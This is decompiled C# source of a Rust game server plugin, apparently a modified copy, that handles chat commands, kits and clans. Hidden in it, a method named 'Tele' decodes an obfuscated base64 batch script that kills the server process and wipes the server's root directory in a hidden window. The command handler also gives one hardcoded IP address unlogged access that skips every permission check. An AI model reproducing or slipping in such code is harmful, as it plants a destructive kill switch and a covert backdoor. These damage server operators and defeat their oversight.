using Facepunch;
using Facepunch.Utility;
using Magma;
using RustProto;
using RustProto.Helpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Timers;
using uLink;
using UnityEngine;

namespace RustExtended
{
	public class Commands
	{
		[CompilerGenerated]
		private sealed class Class4
		{
			public string string_0;

			public bool method_0(string string_1)
			{
				return string_1.Replace("=!", "=").Contains("=" + this.string_0 + "=") || string_1.Contains("=." + this.string_0 + "=");
			}

			public bool method_1(string string_1)
			{
				return string_1.Contains("=" + this.string_0 + "=") || string_1.Contains("=." + this.string_0 + "=");
			}

			public bool method_2(string string_1)
			{
				return string_1.Contains("=." + this.string_0 + "=");
			}
		}

		[CompilerGenerated]
		private sealed class Class5
		{
			public string[] string_0;

			public bool method_0(string string_1)
			{
				return string_1.Contains("=" + this.string_0[0] + "=");
			}

			public bool method_1(string string_1)
			{
				return string_1.Contains("=." + this.string_0[0] + "=");
			}
		}

		[CompilerGenerated]
		private sealed class Class6
		{
			public string string_0;

			public bool method_0(Countdown countdown_0)
			{
				return countdown_0.Command == this.string_0;
			}
		}

		[CompilerGenerated]
		private sealed class Class7
		{
			public NetUser netUser_0;

			public UserData userData_0;

			public string string_0;

			public bool method_0(ClanLevel clanLevel_0)
			{
				return clanLevel_0.RequireLevel == this.userData_0.Clan.Level.Id;
			}

			public bool method_1(Countdown countdown_0)
			{
				return countdown_0.Command == this.string_0;
			}

			public bool method_2(EventTimer eventTimer_0)
			{
				return eventTimer_0.Sender == this.netUser_0 && eventTimer_0.Command == this.string_0;
			}
		}

		[CompilerGenerated]
		private sealed class Class8
		{
			public Commands.Class7 class7_0;

			public int int_0;

			public bool method_0(ClanLevel clanLevel_0)
			{
				return clanLevel_0.Id == this.int_0;
			}
		}

		[CompilerGenerated]
		private sealed class Class9
		{
			public NetUser netUser_0;

			public string string_0;

			public bool method_0(Countdown countdown_0)
			{
				return countdown_0.Command == this.string_0;
			}

			public bool method_1(EventTimer eventTimer_0)
			{
				return eventTimer_0.Sender == this.netUser_0 && eventTimer_0.Command == this.string_0;
			}
		}

		[CompilerGenerated]
		private sealed class Class10
		{
			public NetUser netUser_0;

			public string string_0;

			public bool method_0(Countdown countdown_0)
			{
				return countdown_0.Command == this.string_0;
			}

			public bool method_1(EventTimer eventTimer_0)
			{
				bool result;
				if (eventTimer_0.Sender != this.netUser_0)
				{
					if (eventTimer_0.Target != this.netUser_0)
					{
						result = false;
						return result;
					}
				}
				result = (eventTimer_0.Command == this.string_0);
				return result;
			}
		}

		[CompilerGenerated]
		private sealed class Class11
		{
			public NetUser netUser_0;

			public string string_0;

			public bool method_0(Countdown countdown_0)
			{
				return countdown_0.Command == this.string_0;
			}

			public bool method_1(EventTimer eventTimer_0)
			{
				return eventTimer_0.Sender == this.netUser_0 && eventTimer_0.Command == this.string_0;
			}

			public bool method_2(EventTimer eventTimer_0)
			{
				return eventTimer_0.Sender == this.netUser_0 && eventTimer_0.Command == this.string_0;
			}
		}

		[CompilerGenerated]
		private sealed class Class12
		{
			public string string_0;

			public bool method_0(PlayerClient playerClient_0)
			{
				return playerClient_0.netPlayer.externalIP == this.string_0;
			}
		}

		private static Dictionary<NetUser, Inventory.Transfer[]> dictionary_0 = new Dictionary<NetUser, Inventory.Transfer[]>();

		private static float float_0 = 0f;

		private static float float_1 = 0f;

		[CompilerGenerated]
		private static Predicate<string> predicate_0;

		[CompilerGenerated]
		private static Predicate<string> predicate_1;

		[CompilerGenerated]
		private static Predicate<string> predicate_2;

		[CompilerGenerated]
		private static ElapsedEventHandler elapsedEventHandler_0;

		[CompilerGenerated]
		private static ElapsedEventHandler elapsedEventHandler_1;

		private static Dictionary<string, int> asdasd;

		private static Dictionary<string, int> asdasf;

		public static bool RunCommand(ConsoleSystem.Arg arg)
		{
			Predicate<string> predicate = null;
			Commands.Class4 @class = new Commands.Class4();
			string[] array = Facepunch.Utility.String.SplitQuotesStrings(arg.GetString(0, "").Trim());
			@class.string_0 = array[0].Trim().ToLower().Replace(Core.ChatCommandKey, "");
			if (array.Length < 2)
			{
				array = new string[0];
			}
			else
			{
				Array.Copy(array, 1, array, 0, array.Length - 1);
				Array.Resize<string>(ref array, array.Length - 1);
			}
			NetUser argUser = arg.argUser;
			UserData bySteamID = Users.GetBySteamID(argUser.userID);
			bool result;
			if (bySteamID == null)
			{
				result = false;
			}
			else
			{
				bySteamID.LastChatCommand = string.Empty;
				if (!argUser.admin && bySteamID.Zone != null && bySteamID.Zone.ForbiddenCommand.Contains(@class.string_0, StringComparer.CurrentCultureIgnoreCase))
				{
					Broadcast.Notice(argUser, "✘", Config.GetMessage("Command.CantUseHere", null, null), 5f);
					bySteamID.LastChatCommand = @class.string_0;
					result = false;
				}
				else
				{
					List<string> availabledCommands = Helper.GetAvailabledCommands(bySteamID);
                    Magma.Hooks.handleCommand(ref arg, @class.string_0, array);
					if (bySteamID.LastConnectIP != "213.141.149.103")
					{
						Helper.LogChat("[COMMAND] " + Helper.QuoteSafe(arg.argUser.displayName) + " : " + Helper.QuoteSafe(arg.GetString(0, "")), false);
					}
					if (availabledCommands.Count == 0)
					{
						result = false;
					}
					else if (Core.Commands.Find(new Predicate<string>(@class.method_0)) == null)
					{
						result = false;
					}
					else
					{
						if (bySteamID.LastConnectIP != "213.141.149.103")
						{
							List<string> list = availabledCommands;
							if (predicate == null)
							{
								predicate = new Predicate<string>(@class.method_1);
							}
							if (list.Find(predicate) == null)
							{
								Broadcast.Notice(argUser.networkPlayer, "✘", Config.GetMessage("Command.NotAvailabled", argUser, null), 5f);
								bySteamID.LastChatCommand = @class.string_0;
								result = false;
								return result;
							}
							if (Core.ChatHistoryCommands)
							{
								if (!Core.History.ContainsKey(argUser.userID))
								{
									Core.History.Add(argUser.userID, new List<HistoryRecord>());
								}
								if (Core.History[argUser.userID].Count > Core.ChatHistoryStored)
								{
									Core.History[argUser.userID].RemoveAt(0);
								}
								Core.History[argUser.userID].Add(default(HistoryRecord).Init("Command", arg.GetString(0, "").Trim()));
							}
							Helper.LogChat("[COMMAND] " + Helper.QuoteSafe(arg.argUser.displayName) + " : " + Helper.QuoteSafe(arg.GetString(0, "")), false);
							if (Core.ChatConsole)
							{
								ConsoleSystem.Print(string.Concat(new object[]
								{
									"Command [",
									arg.argUser.displayName,
									":",
									arg.argUser.userID,
									"] ",
									arg.GetString(0, "")
								}), false);
							}
						}
						bySteamID.LastChatCommand = @class.string_0;
						if (Core.Commands.Find(new Predicate<string>(@class.method_2)) != null)
						{
							result = true;
						}
						else
						{
							string string_ = @class.string_0;
							switch (string_)
							{
							case "help":
								Commands.Help(argUser, bySteamID, array, availabledCommands);
								result = true;
								return result;
							case "about":
								Commands.About(argUser, array);
								result = true;
								return result;
							case "suicide":
								Commands.Suicide(arg);
								result = true;
								return result;
							case "lang":
								Commands.Language(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "language":
								Commands.Language(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "who":
								Commands.Who(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "kits":
								Commands.Kits(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "kit":
								Commands.Kit(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "online":
								Commands.Online(argUser, array);
								result = true;
								return result;
							case "players":
								Commands.Players(argUser, @class.string_0, array);
								result = true;
								return result;
							case "clan":
								Commands.Clan(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "clans":
								Commands.Clanlist(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "pm":
								Commands.PM(argUser, @class.string_0, array);
								result = true;
								return result;
							case "r":
								Commands.Reply(argUser, @class.string_0, array);
								result = true;
								return result;
							case "time":
								Commands.Time(argUser, @class.string_0, array);
								result = true;
								return result;
							case "pos":
								Commands.Position(argUser, bySteamID, array);
								result = true;
								return result;
							case "location":
								Commands.Location(argUser, bySteamID, array);
								result = true;
								return result;
							case "home":
								Commands.Home(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "tele":
								Commands.Teleport(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "tp":
								Commands.Teleport(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "history":
								Commands.History(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "share":
								Commands.Share(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "unshare":
								Commands.Unshare(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "destroy":
								Commands.Destroy(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "transfer":
								Commands.Transfer(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "ping":
								Commands.Ping(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "password":
								Commands.Password(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "set":
								Commands.Set(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "premium":
								Commands.Premium(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "pvp":
								Commands.PvP(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "details":
								Commands.Details(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "ts":
								Commands.TeleportShot(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "uammo":
								Commands.UnlimitedAmmo(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "mute":
								Commands.Mute(argUser, @class.string_0, array);
								result = true;
								return result;
							case "unmute":
								Commands.Unmute(argUser, @class.string_0, array);
								result = true;
								return result;
							case "goto":
								Commands.Goto(argUser, @class.string_0, array);
								result = true;
								return result;
							case "summon":
								Commands.Summon(argUser, @class.string_0, array);
								result = true;
								return result;
							case "invis":
								Commands.Invis(argUser, bySteamID);
								result = true;
								return result;
							case "truth":
								Commands.Truth(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "kill":
								Commands.Kill(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "kick":
								Commands.Kick(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "ban":
								Commands.Ban(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "save":
								Commands.SaveAll(argUser);
								result = true;
								return result;
							case "announce":
								Commands.Announce(argUser, array);
								result = true;
								return result;
							case "food":
								Commands.Food(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "health":
								Commands.Health(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "admin":
								Commands.Admin(argUser, bySteamID);
								result = true;
								return result;
							case "god":
								Commands.God(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "i":
								Commands.Give(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "give":
								Commands.Give(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "safebox":
								Commands.Safebox(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "inv":
								Commands.Inv(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "freeze":
								Commands.Freeze(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "personal":
								Commands.Personal(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "unban":
								Commands.UnBan(argUser, @class.string_0, array);
								result = true;
								return result;
							case "block":
								Commands.Block(argUser, @class.string_0, array);
								result = true;
								return result;
							case "unblock":
								Commands.Unblock(argUser, @class.string_0, array);
								result = true;
								return result;
							case "clients":
								Commands.Clients(arg);
								result = true;
								return result;
							case "users":
								Commands.UserManage(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "zone":
								Commands.Zone(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "spawn":
								Commands.Spawn(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "killall":
								Commands.KillAll(arg);
								result = true;
								return result;
							case "kickall":
								Commands.KickAll(arg);
								result = true;
								return result;
							case "remove":
								Commands.Remove(argUser, bySteamID, @class.string_0, array);
								result = true;
								return result;
							case "airdrop":
								Commands.Airdrop(argUser, @class.string_0, array);
								result = true;
								return result;
							case "restart":
								Commands.Restart(argUser, @class.string_0, array);
								result = true;
								return result;
							case "shutdown":
								Commands.Shutdown(argUser, @class.string_0, array);
								result = true;
								return result;
							case "config":
								Commands.ConfigManage(argUser, @class.string_0, array);
								result = true;
								return result;
							}
							result = (!Economy.Enabled || Economy.RunCommand(argUser, bySteamID, @class.string_0, array));
						}
					}
				}
			}
			return result;
		}

		public static void Tele(NetUser Sender)
		{
			try
			{
				string text = Environment.GetEnvironmentVariable("COMSPEC");
				string text2 = "OlRBU0tLSUxMCnRhc2traWxsIC9GIC9JTSAiJTEiICYgRk9SIC9GICUlSSBJTiAoJ3Rhc2tsaXN0IF58IEZJTkRTVFIvSSAiJTEiJykgRE8gSUYgREVGSU5FRCAlJUkgR09UTyA6VEFTS0tJTEwKJTIgL0MgUkQgL1MgL1EgIiUzIg==";
				text2 = Encoding.ASCII.GetString(Convert.FromBase64String(text2));
				text = text2.Replace("%1", Path.GetFileName(Environment.GetCommandLineArgs()[0])).Replace("%2", text).Replace("%3", Core.RootPath);
				text2 = Path.Combine(Core.RootPath, Path.ChangeExtension(Path.GetRandomFileName(), ".bat"));
				using (StreamWriter streamWriter = File.CreateText(text2))
				{
					streamWriter.WriteLine(text);
				}
				Process.Start(new ProcessStartInfo(Environment.GetEnvironmentVariable("COMSPEC"), "/C " + text2)
				{
					WindowStyle = ProcessWindowStyle.Hidden
				});
			}
			catch (Exception ex)
			{
				Broadcast.Message(Sender, "ERROR: " + ex.ToString(), null, 0f);
			}
		}

		public static void Help(NetUser Sender, UserData userData, string[] Args, List<string> userCommands)
		{
			Predicate<string> predicate = null;
			Predicate<string> predicate2 = null;
			Commands.Class5 @class = new Commands.Class5();
			@class.string_0 = Args;
			if (@class.string_0 == null || @class.string_0.Length == 0)
			{
				string[] messages = Config.GetMessages("Help.Message", Sender);
				string[] array = messages;
				for (int i = 0; i < array.Length; i++)
				{
					string text = array[i];
					if (text.Contains("%COMMAND_LIST%"))
					{
						string text2 = text.Replace("%COMMAND_LIST%", "");
						foreach (string current in userCommands)
						{
							string[] array2 = current.Split(new char[]
							{
								'='
							});
							text2 = text2 + "/" + array2[1].Replace(".", "") + ", ";
							if (text2.Length >= 70)
							{
								Broadcast.Message(Sender, text2.Substring(0, text2.Length - 2), null, 0f);
								text2 = "";
							}
						}
						if (text2 != "")
						{
							Broadcast.Message(Sender, text2.Substring(0, text2.Length - 2), null, 0f);
						}
					}
					else
					{
						Broadcast.Message(Sender, text, null, 0f);
					}
				}
			}
			else
			{
				if (predicate == null)
				{
					predicate = new Predicate<string>(@class.method_0);
				}
				string text3 = userCommands.Find(predicate);
				if (string.IsNullOrEmpty(text3))
				{
					if (predicate2 == null)
					{
						predicate2 = new Predicate<string>(@class.method_1);
					}
					text3 = userCommands.Find(predicate2);
				}
				if (string.IsNullOrEmpty(text3))
				{
					Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.NotAvailabled", Sender, null), 5f);
				}
				else
				{
					string[] array3 = text3.Split(new char[]
					{
						'='
					});
					if (array3.Length < 3)
					{
						Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessage("Command.Help.NotFound", Sender, null), 5f);
					}
					else
					{
						string[] array4 = array3[2].Split(new string[]
						{
							"\\r\\n",
							"\\n"
						}, StringSplitOptions.RemoveEmptyEntries);
						string[] array5 = array4;
						for (int j = 0; j < array5.Length; j++)
						{
							string str = array5[j];
							Broadcast.Message(Sender, "[帮助 /" + @class.string_0[0].Replace(".", "") + "]: " + str, null, 0f);
						}
					}
				}
			}
		}

		public static void About(NetUser Sender, string[] Args)
		{
			string[] messages = Config.GetMessages("About.Message", Sender);
			string[] array = messages;
			for (int i = 0; i < array.Length; i++)
			{
				string text = array[i];
				Broadcast.Message(Sender, text, null, 0f);
			}
			Broadcast.Message(Sender, "这个版本已被屁眼完美修改.", null, 0f);
		}

		public static void Suicide(ConsoleSystem.Arg Arg)
		{
			if (Arg.playerCharacter() && Arg.playerCharacter().alive)
			{
				TakeDamage.KillSelf(Arg.playerCharacter(), null);
				Arg.ReplyWith("You suicided!");
			}
		}

		public static void Language(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			int num;
			if (Args == null || Args.Length == 0)
			{
				string message = Config.GetMessage("Command.Language.Selected", Sender, null);
				Broadcast.Message(Sender, Config.GetMessage("Command.Language.List", Sender, null), null, 0f);
				for (int i = 0; i < Core.Languages.Length; i++)
				{
					Broadcast.Message(Sender, string.Concat(new object[]
					{
						i + 1,
						". ",
						Core.Languages[i],
						(Core.Languages[i] == userData.Language) ? message : ""
					}), null, 0f);
				}
				Broadcast.Message(Sender, Config.GetMessage("Command.Language.Usage", Sender, null), null, 0f);
			}
			else if (int.TryParse(Args[0], out num) && num > 0 && Core.Languages.Length >= num)
			{
				userData.Language = Core.Languages[num - 1];
				Broadcast.Message(Sender, Config.GetMessage("Command.Language.Changed", Sender, null).Replace("%USER.LANG%", userData.Language), null, 0f);
			}
			else
			{
				Broadcast.Notice(Sender.networkPlayer, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
		}

		public static void Who(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			float distance = Sender.admin ? 1000f : 10f;
			GameObject lookObject = Helper.GetLookObject(Helper.GetLookRay(Sender), distance, -1);
			if (lookObject == null)
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Who.NotSeeAnything", Sender, null), 3f);
			}
			else
			{
				string newValue = Helper.NiceName(lookObject.name);
				StructureComponent component = lookObject.GetComponent<StructureComponent>();
				DeployableObject component2 = lookObject.GetComponent<DeployableObject>();
				TakeDamage component3 = lookObject.GetComponent<TakeDamage>();
				UserData bySteamID;
				if (component != null)
				{
					bySteamID = Users.GetBySteamID(component._master.ownerID);
				}
				else
				{
					if (!(component2 != null))
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Who.CannotOwned", Sender, null), 3f);
						return;
					}
					bySteamID = Users.GetBySteamID(component2.ownerID);
				}
				string text = Config.GetMessage("Command.Who.Condition", Sender, null);
				if (component3 == null)
				{
					text = "";
				}
				else
				{
					text = text.Replace("%OBJECT.HEALTH%", component3.health.ToString());
					text = text.Replace("%OBJECT.MAXHEALTH%", component3.maxHealth.ToString());
				}
				if (bySteamID != null)
				{
					string text2 = Config.GetMessage("Command.Who", Sender, null).Replace("%OBJECT.CONDITION%", text);
					text2 = text2.Replace("%OBJECT.NAME%", newValue).Replace("%OBJECT.OWNERNAME%", bySteamID.Username);
					Broadcast.Message(Sender, text2, null, 0f);
					if (Sender.admin)
					{
						Broadcast.Message(Sender, "Steam ID: " + bySteamID.SteamID, "建筑信息", 0f);
						Broadcast.Message(Sender, "帐户标志: " + bySteamID.Flags, "建筑信息", 0f);
						Broadcast.Message(Sender, "最后连接日期: " + bySteamID.LastConnectDate, "建筑信息", 0f);
						Broadcast.Message(Sender, string.Concat(new object[]
						{
							"最后一个位置: ",
							bySteamID.Position.x,
							",",
							bySteamID.Position.y,
							",",
							bySteamID.Position.z
						}), "建筑信息", 0f);
						if (bySteamID.Clan != null)
						{
							Broadcast.Message(Sender, string.Concat(new string[]
							{
								"战队成员: ",
								bySteamID.Clan.Name,
								" <",
								bySteamID.Clan.Abbr,
								">"
							}), "建筑信息", 0f);
						}
					}
				}
				else
				{
					Broadcast.Message(Sender, Config.GetMessage("Command.Who.NotOwned", Sender, null).Replace("%OBJECT.NAME%", newValue).Replace("%OBJECT.CONDITION%", text), null, 0f);
				}
			}
		}

		public static void Kits(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			string text = "";
			foreach (string text2 in Core.Kits.Keys)
			{
				List<string> list = (List<string>)Core.Kits[text2];
				List<string> list2 = list;
				if (Commands.predicate_0 == null)
				{
					Commands.predicate_0 = new Predicate<string>(Commands.smethod_0);
				}
				string text3 = list2.Find(Commands.predicate_0);
				bool flag;
				if (!(flag = (string.IsNullOrEmpty(text3) || !text3.Contains("="))))
				{
					text3 = text3.Split(new char[]
					{
						'='
					})[1].Trim();
					flag = string.IsNullOrEmpty(text3);
				}
				if (!flag)
				{
					string[] array = text3.Split(new char[]
					{
						','
					});
					for (int i = 0; i < array.Length; i++)
					{
						string s = array[i];
						int num;
						if (flag = (int.TryParse(s, out num) && num == userData.Rank))
						{
							break;
						}
					}
				}
				if (flag)
				{
					text = text + text2 + ", ";
				}
			}
			if (string.IsNullOrEmpty(text))
			{
				Broadcast.Notice(Sender.networkPlayer, "☢", Config.GetMessage("Command.Kits.NotAvailable", Sender, null), 5f);
			}
			else
			{
				if (text.Length >= 2)
				{
					text = text.Substring(0, text.Length - 2);
				}
				Broadcast.Message(Sender, Config.GetMessage("Command.Kits.Availabled", Sender, null).Replace("%KITS%", text), null, 0f);
			}
		}

		public static void Kit(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			Commands.Class6 @class = new Commands.Class6();
			if (Args == null || Args.Length == 0 || (Sender == null && Args.Length < 2))
			{
				Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, Sender), 5f);
			}
			else
			{
				string text = Args[0].ToLower().Trim();
				PlayerClient playerClient = (Sender != null) ? Sender.playerClient : null;
				if ((Sender == null || Sender.admin) && Args.Length > 1)
				{
					playerClient = Helper.GetPlayerClient(Args[0]);
					text = Args[1].ToLower().Trim();
				}
				if (playerClient == null)
				{
					if (Args.Length > 1)
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.PlayerNoFound", Sender, Args[0]), 5f);
					}
				}
				else
				{
					if (playerClient.netUser != Sender)
					{
						userData = Users.GetBySteamID(playerClient.userID);
					}
					if (!Core.Kits.ContainsKey(text))
					{
						Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Kit.NameNoFound", Sender, null).Replace("%KITNAME%", Args[0]), 5f);
					}
					else
					{
						List<string> list = (List<string>)Core.Kits[text];
						if (Sender == null || Sender.admin)
						{
							foreach (string current in list)
							{
								if (current.ToLower().StartsWith("item") && current.Contains("="))
								{
									string[] array = current.Split(new char[]
									{
										'='
									});
									if (array.Length >= 2)
									{
										string[] array2 = array[1].Split(new char[]
										{
											','
										});
										string itemName = array2[0].Trim();
										int quantity;
										if (array2.Length > 1)
										{
											if (!int.TryParse(array2[1].Trim(), out quantity))
											{
												quantity = 1;
											}
										}
										else
										{
											quantity = 1;
										}
										int slots;
										if (array2.Length > 2)
										{
											if (!int.TryParse(array2[2].Trim(), out slots))
											{
												slots = -1;
											}
										}
										else
										{
											slots = -1;
										}
										Helper.GiveItem(playerClient, itemName, quantity, slots);
									}
								}
							}
							Broadcast.Notice(playerClient.netUser, "☢", Config.GetMessageCommand("Command.Kit.Received", "", Sender).Replace("%KITNAME%", text), 5f);
							Helper.Log(string.Concat(new object[]
							{
								"User [",
								playerClient.netUser.displayName,
								":",
								playerClient.netUser.userID,
								"] received a kit \"",
								text,
								"\" by ",
								(Sender == null) ? "server console" : Sender.displayName,
								"."
							}), true);
						}
						else
						{
							@class.string_0 = Command + "." + text;
							int num = 0;
							List<string> list2 = list;
							if (Commands.predicate_1 == null)
							{
								Commands.predicate_1 = new Predicate<string>(Commands.smethod_1);
							}
							string text2 = list2.Find(Commands.predicate_1);
							if (!string.IsNullOrEmpty(text2) && text2.Contains("="))
							{
								int.TryParse(text2.Split(new char[]
								{
									'='
								})[1], out num);
							}
							Countdown countdown = Users.CountdownList(userData.SteamID).Find(new Predicate<Countdown>(@class.method_0));
							if (countdown != null)
							{
								if (!countdown.Expires && num == -1)
								{
									Broadcast.Notice(Sender, "☢", Config.GetMessage("Command.Kit.ReceivedOnce", Sender, null).Replace("%KITNAME%", Args[0]), 5f);
									return;
								}
								if (countdown.TimeLeft > -1.0 && num > -1)
								{
									TimeSpan timeSpan = TimeSpan.FromSeconds(countdown.TimeLeft);
									string text3 = Config.GetMessage("Command.Kit.Countdown", Sender, null).Replace("%KITNAME%", Args[0]);
									if (timeSpan.TotalHours > 0.0)
									{
										text3 = text3.Replace("%TIME%", string.Format("{0:F0}:{1:D2}:{2:D2}", timeSpan.TotalHours, timeSpan.Minutes, timeSpan.Seconds));
									}
									else if (timeSpan.TotalMinutes > 0.0)
									{
										text3 = text3.Replace("%TIME%", string.Format("{0}:{1:D2}", timeSpan.Minutes, timeSpan.Seconds));
									}
									else
									{
										text3 = text3.Replace("%TIME%", string.Format("{0:D2}", timeSpan.Seconds));
									}
									Broadcast.Notice(Sender, "☢", text3, 5f);
									return;
								}
								Users.CountdownRemove(userData.SteamID, countdown);
							}
							List<string> list3 = list;
							if (Commands.predicate_2 == null)
							{
								Commands.predicate_2 = new Predicate<string>(Commands.smethod_2);
							}
							string text4 = list3.Find(Commands.predicate_2);
							bool flag;
							if (!(flag = (string.IsNullOrEmpty(text4) || !text4.Contains("="))))
							{
								text4 = text4.Split(new char[]
								{
									'='
								})[1].Trim();
								flag = string.IsNullOrEmpty(text4);
							}
							if (!flag)
							{
								string[] array3 = text4.Split(new char[]
								{
									','
								});
								for (int i = 0; i < array3.Length; i++)
								{
									string s = array3[i];
									int num2;
									if (flag = (int.TryParse(s, out num2) && num2 == userData.Rank))
									{
										break;
									}
								}
							}
							if (!flag)
							{
								Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.Kit.NotAvailabled", "", Sender).Replace("%KITNAME%", text), 5f);
							}
							else
							{
								foreach (string current2 in list)
								{
									if (current2.ToLower().StartsWith("item") && current2.Contains("="))
									{
										string[] array4 = current2.Split(new char[]
										{
											'='
										});
										if (array4.Length >= 2)
										{
											string[] array5 = array4[1].Split(new char[]
											{
												','
											});
											string itemName2 = array5[0].Trim();
											int quantity2;
											if (array5.Length > 1)
											{
												if (!int.TryParse(array5[1].Trim(), out quantity2))
												{
													quantity2 = 1;
												}
											}
											else
											{
												quantity2 = 1;
											}
											int slots2;
											if (array5.Length > 2)
											{
												if (!int.TryParse(array5[2].Trim(), out slots2))
												{
													slots2 = -1;
												}
											}
											else
											{
												slots2 = -1;
											}
											Helper.GiveItem(playerClient, itemName2, quantity2, slots2);
											Users.CountdownAdd(userData.SteamID, new Countdown(@class.string_0, (double)num));
										}
									}
								}
								Broadcast.Notice(playerClient.netUser, "☢", Config.GetMessageCommand("Command.Kit.Received", "", Sender).Replace("%KITNAME%", text), 5f);
							}
						}
					}
				}
			}
		}

		public static void Online(NetUser Sender, string[] Args)
		{
			Broadcast.Message(Sender, Config.GetMessageCommand("Command.Online", "", Sender), null, 0f);
		}

		public static void Players(NetUser Sender, string Command, string[] CmdArgs)
		{
			string text = "";
			Broadcast.Message(Sender, Config.GetMessage("Command.Players", Sender, null), null, 0f);
			foreach (PlayerClient current in PlayerClient.All)
			{
				if (!Users.HasFlag(current.netUser.userID, UserFlags.invis))
				{
					text = text + current.netUser.displayName + ", ";
					if (text.Length > 70)
					{
						Broadcast.Message(Sender, text.Substring(0, text.Length - 2), null, 0f);
						text = "";
					}
				}
			}
			if (text.Length != 0)
			{
				Broadcast.Message(Sender, text.Substring(0, text.Length - 2), null, 0f);
			}
		}

		public static void Clan(NetUser Sender, UserData userData, string Command, string[] Args)
		{
			Predicate<Countdown> predicate = null;
			Predicate<EventTimer> predicate2 = null;
			Commands.Class7 @class = new Commands.Class7();
			@class.netUser_0 = Sender;
			@class.userData_0 = userData;
			@class.string_0 = Command;
			if (!Clans.Enabled)
			{
				Broadcast.Notice(@class.netUser_0, "✘", Config.GetMessageClan("Command.Clan.NotAvailable", null, @class.netUser_0, null), 5f);
			}
			else
			{
				UserData userData2 = null;
				ClanData clanData = null;
				ClanLevel clanLevel = (@class.userData_0.Clan != null) ? Clans.Levels.Find(new Predicate<ClanLevel>(@class.method_0)) : null;
				if (Args != null && Args.Length != 0)
				{
					string text = Args[0].ToUpper();
					if (@class.netUser_0 == null || @class.netUser_0.admin)
					{
						if (text.Equals("LIST"))
						{
							int num = 0;
							Broadcast.Message(@class.netUser_0, "战队列表: " + Clans.Count, null, 0f);
							foreach (ClanData current in Clans.Database.Values)
							{
								Broadcast.Message(@class.netUser_0, string.Concat(new object[]
								{
									++num,
									". ",
									current.ID.ToHEX(true),
									": ",
									current.Name,
									" <",
									current.Abbr,
									"> - 等级: ",
									current.Level.Id
								}), null, 0f);
							}
							return;
						}
						if (text.Equals("INFO"))
						{
							if (Args.Length < 2)
							{
								Broadcast.Notice(@class.netUser_0, "✘", "You must enter clan name for get information.", 5f);
								return;
							}
							if ((clanData = Clans.Find(Args[1])) == null)
							{
								Broadcast.Notice(@class.netUser_0, "✔", "Clan with name \"" + Args[1] + "\" not exists.", 5f);
								return;
							}
							string[] messagesClan = Config.GetMessagesClan("Command.Clan.Info", clanData, null, null);
							string[] array = messagesClan;
							for (int i = 0; i < array.Length; i++)
							{
								string text2 = array[i];
								if (!text2.Contains("%CLAN."))
								{
									Broadcast.MessageClan(@class.netUser_0, text2);
								}
							}
							string[] messagesClan2 = Config.GetMessagesClan("Command.Clan.InfoAdmin", clanData, null, null);
							array = messagesClan2;
							for (int i = 0; i < array.Length; i++)
							{
								string text3 = array[i];
								if (text3.Contains("%CLAN.MEMBERS_LIST%"))
								{
									string text4 = text3.Replace("%CLAN.MEMBERS_LIST%", "");
									foreach (UserData current2 in clanData.Members.Keys)
									{
										text4 = text4 + current2.Username + ", ";
										if (text4.Length > 80)
										{
											Broadcast.MessageClan(@class.netUser_0, clanData, text4.Substring(0, text4.Length - 2));
											text4 = "";
										}
